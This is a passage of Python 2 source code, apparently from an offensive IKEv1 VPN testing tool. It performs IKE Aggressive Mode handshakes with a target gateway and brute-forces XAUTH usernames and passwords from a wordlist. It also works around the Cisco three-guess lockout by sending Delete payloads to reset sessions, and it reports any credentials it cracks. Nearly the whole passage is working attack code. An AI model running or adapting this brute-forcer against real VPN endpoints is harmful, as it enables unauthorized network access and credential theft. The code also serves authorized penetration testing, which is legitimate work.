	                        lenHDR = len(arrayHDR)
	                        bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	                        bytesIKE = bytesHDR+bytesencPayload

	                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
				dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				while len(packets) < 3:
					time.sleep(0.5)

						
                	        if len(packets) == 3:
	                        	#Parse the header first
	                        	ikeHandling = ikehandler.IKEv1Handler(debug)
	                        	ikeHDR = ikeHandling.parseHeader(packets[-1])
	                        	#Check the packet is for this session
	                        	if ikeHDR[1] == dicCrypto["iCookie"]:
	                        	        pass
	                        	else:   
						if debug > 0:
		                        	        print "Packet received does not match this session, this is probably from a previous incarnation."
							print "Removing packet"
	                        		del packets[-1]
	                        	        continue
                        		if ikeHDR[4] == 5:
						###***add check for malformed payload and retry if true
                                		print "Informational packet received. Enable full debugging for more info. Exiting..."
						respDict = ikeHandling.main(packets[-1],encType,hashType)
						time.sleep(2)
                                		exit()
                        		else:
                                		pass

	                        	try:   
	                        		#Check for a new Message ID
        	                        	if ikeHDR[5] == dicCrypto["msgID"]:
                	                	        if debug > 0:
                	                	                print "Message ID has not changed"
	
	                                	        curIV = dicCrypto["lastBlock"].decode('hex')
	                                	        pass    
       	                        		else:
                                        		if debug > 0:
                                        		        print "Message ID has changed, recalculating IV"
                                        		msgID = ikeHDR[5]
                                        		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        		pass
                        		except:
                        	        	print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
						time.sleep(2)
                                		exit()

			
	        		        respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
	        		        #Update state/crypto dictionary
					dicCrypto = dict(dicCrypto.items() + respDict.items())
	        		        dicCrypto["lastBlock"] = packets[-1][-IVlen:]
			                #Pull the useful values from stored dictionary for crypto functions
			                nonce_i = dicCrypto["nonce_i"]
			                DHPubKey_i = dicCrypto["DHPubKey_i"]
			       	        nonce_r = dicCrypto["nonce_r"]
			       	        ID_i = dicCrypto["ID_i"]
		                        ID_r = dicCrypto["ID_r"]
		                        rCookie = dicCrypto["rCookie"]
		                        iCookie = dicCrypto["iCookie"]
		                        msgID = dicCrypto["msgID"]
		                        privKey = dicCrypto["privKey"]
		                        DHPubKey_r = dicCrypto["DHPubKey_r"]
		                        SA_i = dicCrypto["SA_i"]
		                        xType = int(dicCrypto["xType"])
		                        if xType != 6:
		                                print "Expected Mode Config Transaction packet."
		                                print "Exiting...\n"
						time.sleep(2)
		                                exit()
		                        else:   
		                                pass
					if int(dicCrypto["mcfgType"]) == 1:
						if debug > 0:
							print "Retransmitted XAUTH request received, Continuing..."
						del packets[-1]
						continue

                                        if int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						try:
							vendorType
						except:
							vendorType = "unknown"


						if vendorType == "cisco":
							if debug > 0:
								"XAUTH Authentication failed, restarting connection."
                                                        if guessno == 3:
                                                                if debug > 0:
                                                                        print "Cisco 3 guess limit reached, restarting"
	                        				xType = "05" #Informational

								#Process Delete payload
                                                                #Hash payload
                                                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                                                lenHash = len(arrayHash)
                                                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)
									
								#Delete payload
								arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
								lenDel = len(arrayDel)
								bytesDel = struct.pack(("B"*lenDel),*arrayDel)

								#Encrypt everything but the header
                        					plainData = (bytesHash+bytesDel)
                        					plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        					if debug > 0:
                        				        	print "Plain-text Payload: %s"%plainPayload.encode('hex')

         			               			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
								#Calc message ID and current IV
								msgID = "0000111b"
								curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                        					cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        					encPayload = cipher.encrypt(plainPayload)

                        					if debug > 0:
                        				        	print "Encrypted Payload: %s"%encPayload.encode('hex')
			
        	        			        	arrayencPayload = array.array('B', encPayload)
        	                				lenencPayload = len(arrayencPayload)
        	                				bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
								
                                                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                                                lenHDR = len(arrayHDR)
                                                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
	
								#Send Delete payload
								bytesIKE = bytesHDR+bytesencPayload
								ikeneg.sendPacket(bytesIKE,targetIP,sport,port)

								del nonce_i,nonce_r,DHPubKey_i,ID_i,ID_r,rCookie,iCookie,msgID,privKey,DHPubKey_r,SA_i,xType,initIV,curIV
                                                                del packets[:]
								del dupPackets[:]
								del listVIDs[:]
								dicCrypto.clear()
                                                                respDict.clear()
                                                                initDict.clear()
								dicVIDs.clear()
								break
								
							else:
								pass
						else:
        	                                        pass

		                        if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
						#False positive check for older ASA's
						try:
							aType = int(authType)
						except:
							aType = int(authType,16)
						if vendorType == "cisco" and aType == 1 and wordline < 1:
							print "\n[-]Older ASA detected, run the tool again with authentication type 65001 (XAUTHInitPreShare) instead of type 1 (PSK). Exiting..."
						else:
							print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

		                                #Mode Config payload - ACK
		                                ackXAUTH = ikeneg.ikeXAUTH(0,16527,"00")
		                                mcfgAtts = ackXAUTH
		                                arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = mode config ACK
		                                lenMCFG = len(arrayMCFG)
		                                bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)

			                        #Process response packet
						if debug > 0:
	                        			print "\n--------------------Sending third packet - Encrypted XAUTH ACK --------------------\n"
                        			xType = "06" #Mode Config transation

                        			#Hash payload
                        			skeyid_a = dicCrypto["skeyid_a"]
                        			mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        			if debug > 0:
                        			        print "Mode Config Hash = %s"%mcfgHash
                        			arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        			lenHash = len(arrayHash)
                        			bytesHash = struct.pack(("B"*lenHash),*arrayHash)

			                        #Encrypt everything but the header
                			        plainData = (bytesHash+bytesMCFG)
                        			plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        			if debug > 0:
                                			print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        			#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        			cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        			encPayload = cipher.encrypt(plainPayload)

                        			if debug > 0:
                                			print "Encrypted Payload: %s"%encPayload.encode('hex')

                        			arrayencPayload = array.array('B', encPayload)
                        			lenencPayload = len(arrayencPayload)
                        			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                        			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                        			lenHDR = len(arrayHDR)
                        			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                        			bytesIKE = bytesHDR+bytesencPayload

                        			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]

                                		#Delete payload
                                		arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                		lenDel = len(arrayDel)
                                		bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                		#Encrypt everything but the header
                                		plainData = (bytesHash+bytesDel)
                                		plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                		if debug > 0:
                                        		print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                		#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                		#Calc message ID and current IV
                                		msgID = "0000111b"
                                		curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                		cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                		encPayload = cipher.encrypt(plainPayload)
                                		if debug > 0:
                                        		print "Encrypted Payload: %s"%encPayload.encode('hex')

                                		arrayencPayload = array.array('B', encPayload)
                                		lenencPayload = len(arrayencPayload)
                                		bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
	
                                		arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                		lenHDR = len(arrayHDR)
                                		bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                		#Send Delete payload
                                		bytesIKE = bytesHDR+bytesencPayload
                                		ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        			time.sleep(5)
			                        exit()

					if dicCrypto["mcfgType"] == "03" or dicCrypto["mcfgType"] == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:
						del packets[-2]
						pass

					else:
						pass
				if vendorType == "cisco":
					print "[-]Password not found, try another wordlist. Exiting...\n"
					exit()
				else:
					pass

			if vendorType != "cisco":
	                        print "[-]Password not found, try another wordlist. Exiting...\n"
        	                exit()
			else:
				pass

		else:
                        if debug > 0:
                                print "Response received, processing packet..."
                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])

                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
					print "Removing packet"
                                del packets[-1]
                                continue

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

                        respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
                        dicCrypto["lastBlock"] = packets[-1][-IVlen:]

	      #Exit if while condition is not met (eof)
	      print "[-]Password not found, try another wordlist. Exiting...\n"
	      time.sleep(2)
	      exit()



	    elif connect:
		#Test a connection
		ikeneg = ikeclient.IKEv1Client(debug)
		ikeCrypto = crypto.ikeCrypto()
		sentPackets = 0
		if len(packets) == 0 and sentPackets == 0:
			print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"

			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,0,keyLen)
			dicCrypto = dict(initDict.items())
			time.sleep(speed)
			while len(packets) < 1:
				time.sleep(0.5)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."
			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			ikeHDR = ikeHandling.parseHeader(packets[-1])

			#Check the packet is for this session
			if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
				if debug > 0:
	                                print "Packet received does not match this session, this is probably from a previous incarnation."
        				print "Removing packet"
	                        del packets[0]
                                continue

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
                        else:   
                                pass

                        flags = "01"
                        respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
                        dicVIDs = vid.dicVIDs
                        for i in listVIDs:
                                try:   
					if debug > 0:
	                                        print "VID received: %s (%s)"%(dicVIDs[i], i)
                                        if "Cisco" in dicVIDs[i]:
                                                vendorType = "cisco"
                                except:
					if debug >0:
	                                        print "Unknown VID received: %s"%i

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
			
			#Construct final aggressive mode exchange packet
			print "\n--------------------Sending second aggressive mode packet--------------------"
			#Run Crypto Functions - DH first
			ikeDH = dh.DiffieHellman(DHGroup)
			secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
			
			hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int
			if debug > 0:
				print len(hexSecret)
				print hexSecret
			if len(hexSecret) % 2 != 0:
				hexSecret = "0" + hexSecret
			if debug > 0:
				print "Secret: %s"%secret
				print "Hexlified Secret: %s"%hexSecret

			skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
			hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
			hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
			skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
			if len(skeyid_e) < keyLen:
				encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
                                if debug > 0:
                                        print "Encryption Key: %s"%encKey.encode('hex')
			else:
				encKey = skeyid_e[:keyLen]
				if debug > 0:
					print "Encryption Key: %s"%encKey.encode('hex')
			initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
			
			dicCrypto["skeyid"] = skeyid
			dicCrypto["skeyid_a"] = skeyid_a
			dicCrypto["skeyid_d"] = skeyid_d
			dicCrypto["skeyid_e"] = skeyid_e
			dicCrypto["encKey"] = encKey
			dicCrypto["initIV"] = initIV

			#Hash payload
			arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload 11 = notification
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)
			
			#VID payload
			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        lenVID = len(arrayVID)
                        bytesVID = struct.pack(("B"*lenVID),*arrayVID)
			
                        #Encrypt everything but the header
			plainData = bytesHash+bytesVID
			plainPayload = ikeCrypto.calcPadding(encType, plainData)
			if debug > 0: 
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        encPayload = cipher.encrypt(plainPayload)
			
			if debug > 0:
				print "Encrypted Payload: %s"%encPayload.encode('hex')

        		arrayencPayload = array.array('B', encPayload)
			lenencPayload = len(arrayencPayload)
			bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
			arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
			lenHDR = len(arrayHDR)
			bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  		bytesIKE = bytesHDR+bytesencPayload
			ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
			dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#p2IV and last block are the same at this point
			while len(packets) < 2:
				time.sleep(0.5)
				count = 0
				count += 1
				if count > 15:
					print "No further responses received.\nExiting...\n"

                 
                if len(packets) == 2:
			#Parse the header first
		        ikeHandling = ikehandler.IKEv1Handler(debug)
		        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                        	pass
                        else:
                                print "Packet received does not match this session, this is probably from a previous incarnation."
                                del packets[-1]
				print len(packets)
				print packets[-1]
                                print "Removing packet"  
                                continue

			#Check for informational packet
                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."            
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
			else:
				pass

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

			#Parse full packet
			respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
			#Update state/crypto dictionary
			dicCrypto.update(respDict) 
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]

                        #Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
                        nonce_r = dicCrypto["nonce_r"]
                        ID_i = dicCrypto["ID_i"]
                        ID_r = dicCrypto["ID_r"]
                        rCookie = dicCrypto["rCookie"]
			iCookie = dicCrypto["iCookie"]
                        msgID = dicCrypto["msgID"]
                        privKey = dicCrypto["privKey"] 
                        DHPubKey_r = dicCrypto["DHPubKey_r"]
                        SA_i = dicCrypto["SA_i"]
			xType = int(dicCrypto["xType"])
                        if xType != 6:
                                print "Expected Mode Config Transaction packet."
                                print "Exiting...\n"
				time.sleep(2)
                                exit()
			else:
				pass

            
			#Process response packet
                        print "\n--------------------Sending third packet - Encrypted XAUTH reply (username: %s password: %s)--------------------"%(username,password)
                        xType = "06" #Mode Config transation
			try:
				vendorType
				if vendorType == "cisco":
					typeXAUTH = ikeneg.ikeXAUTH(0,16520,0,vendorType)
				        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
		                        passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
		                        mcfgAtts = typeXAUTH+userXAUTH+passXAUTH
				else:
					userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
                                	passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
                                	mcfgAtts = userXAUTH+passXAUTH
			except:
	                        userXAUTH = ikeneg.ikeXAUTH(0,16521,username)
        	                passXAUTH = ikeneg.ikeXAUTH(0,16522,password)
        	                mcfgAtts = userXAUTH+passXAUTH

                        #Mode Config payload   
                        arrayMCFG = ikeneg.ikeModeCFG("00","02",mcfgAtts) #02 = mode config Reply
                        lenMCFG = len(arrayMCFG)
                        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)

                        #Hash payload
                        skeyid_a = dicCrypto["skeyid_a"]
                        mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        if debug > 0:
                                print "Mode Config Hash = %s"%mcfgHash
                        arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        lenHash = len(arrayHash)
                        bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                        #Encrypt everything but the header
                        plainData = (bytesHash+bytesMCFG)
                        plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        if debug > 0:
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        encPayload = cipher.encrypt(plainPayload)

                        if debug > 0:
                                print "Encrypted Payload: %s"%encPayload.encode('hex')

                        arrayencPayload = array.array('B', encPayload)
                        lenencPayload = len(arrayencPayload)
                        bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                        arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                        lenHDR = len(arrayHDR)
                        bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                        bytesIKE = bytesHDR+bytesencPayload

                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]

			time.sleep(speed)
			while len(packets) < 2:
				time.sleep(0.5)

		if len(packets) == 3:
			#Process Header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:   
                                print "Packet received does not match this session, this is probably from a previous incarnation."
                                del packets[-1]
                                print "Removing packet"
                                continue

                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."            
				respDict  = ikeHandling.main(packets[-1],encType,hashType)
				time.sleep(2)
                                exit()
			else:
				pass

                        try:   
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"

                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass    
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
				time.sleep(2)
                                exit()

			#Process full packet
                        respDict = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)


			#Check response and send ACK if successful
                       	if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 1:
				print "[*]XAUTH Authentication Successful! Username: %s Password: %s\nSending ACK packet...\n"%(username,password)

                	        #Mode Config payload - ACK
				msgID = "0000111a"
				if debug > 0:
					print "\n--------------------Sending third packet - Encrypted XAUTH ACK --------------------"
				if vendorType == "cisco":
		        	        ackXAUTH = ikeneg.ikeXAUTH(0,16527,1,"cisco")
				else:
					ackXAUTH = ikeneg.ikeXAUTH(0,16527,1)
                       	        mcfgAtts = ackXAUTH
	        	        arrayMCFG = ikeneg.ikeModeCFG("00","04",mcfgAtts) #04 = Mode Config ACK
	         	        lenMCFG = len(arrayMCFG)
	        	        bytesMCFG = struct.pack(("B"*lenMCFG),*arrayMCFG)

                                #Hash payload
                                skeyid_a = dicCrypto["skeyid_a"]
                                mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                                if debug > 0:
                                	print "Mode Config Hash = %s"%mcfgHash
                                arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                                lenHash = len(arrayHash)
                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesMCFG)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                	print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
				curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)

                                if debug > 0:
                                	print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
                                lenencPayload = len(arrayencPayload)
                                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                lenHDR = len(arrayHDR)
                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
                                bytesIKE = bytesHDR+bytesencPayload

                                #Send ACK packet
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                                dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
				time.sleep(4)

				#Close the tunnel
				msgID = "0000111a"
                                xType = "05" #Informational
                                #Process Delete payload
                                #Hash payload   
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                lenHash = len(arrayHash)
                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                #Delete payload
                                if debug > 0:
                                	print "\n--------------------Sending Delete Packet--------------------"
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                lenDel = len(arrayDel)
                                bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)
                                plainPayload = ikeCrypto.calcPadding(encType, plainData)
                                if debug > 0:
                                	print "Plain-text Payload: %s"%plainPayload.encode('hex')

                                #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                                #Calc message ID and current IV
                                msgID = "0000111b"
                                curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                                encPayload = cipher.encrypt(plainPayload)

                                if debug > 0:
                                	print "Encrypted Payload: %s"%encPayload.encode('hex')

                                arrayencPayload = array.array('B', encPayload)
                                lenencPayload = len(arrayencPayload)
                                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)

                                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
                                lenHDR = len(arrayHDR)
                                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)

                                #Send Delete payload
                                bytesIKE = bytesHDR+bytesencPayload
                                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)


			if dicCrypto["mcfgType"] == "03" or int(dicCrypto["mcfgType"]) == 3 and int(dicCrypto["XAUTH_STATUS"]) == 0:              
				print "Mode Config STATUS message received - Authentication Unsuccessful"
				#Process response packet
				if debug > 0:
		                        print "\n--------------------Sending third packet - Encrypted XAUTH ACK (username: %s password: %s)--------------------"%(username,password)
	                        xType = "06" #Mode Config transation
				
				#Hash Payload
	                        skeyid_a = dicCrypto["skeyid_a"]
	                        mcfgHash = ikeCrypto.calcHASHmcfg(skeyid_a, msgID.decode('hex'), bytesMCFG, hashType)
                        	if debug > 0:
                        	        print "Mode Config Hash = %s"%mcfgHash
                        	arrayHash = ikeneg.ikeHash("0e",mcfgHash) #next payload 0e(14) - Mode Config Attributes
                        	lenHash = len(arrayHash)
                        	bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                        	#Encrypt everything but the header
                        	plainData = (bytesHash+bytesMCFG)
                        	plainPayload = ikeCrypto.calcPadding(encType, plainData)
                        	if debug > 0:
                        	        print "Plain-text Payload: %s"%plainPayload.encode('hex')

                        	#Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        	cipher = ikeCrypto.ikeCipher(encKey, dicCrypto["lastBlock"].decode('hex'), encType)
                        	encPayload = cipher.encrypt(plainPayload)

                        	if debug > 0:
                        	        print "Encrypted Payload: %s"%encPayload.encode('hex')
	
        	                arrayencPayload = array.array('B', encPayload)
        	                lenencPayload = len(arrayencPayload)
        	                bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
        	                arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,flags,xType,msgID,lenencPayload)#next payload is always hash (08)
        	                lenHDR = len(arrayHDR)
        	                bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
        	                bytesIKE = bytesHDR+bytesencPayload
				
				#Send ACK packet
        	                ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
        	                dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]

                                #Process Delete payload
                                #Hash payload
                                if debug > 0:
                                        print "Sending Delete payload to reset connection"
                                arrayHash = ikeneg.ikeHash("0c",hash_i) # next payload - 12 (delete)
                                lenHash = len(arrayHash)
                                bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                                #Delete payload
                                arrayDel = ikeneg.ikeDelete("00",iCookie,rCookie)
                                lenDel = len(arrayDel)
                                bytesDel = struct.pack(("B"*lenDel),*arrayDel)

                                #Encrypt everything but the header
                                plainData = (bytesHash+bytesDel)
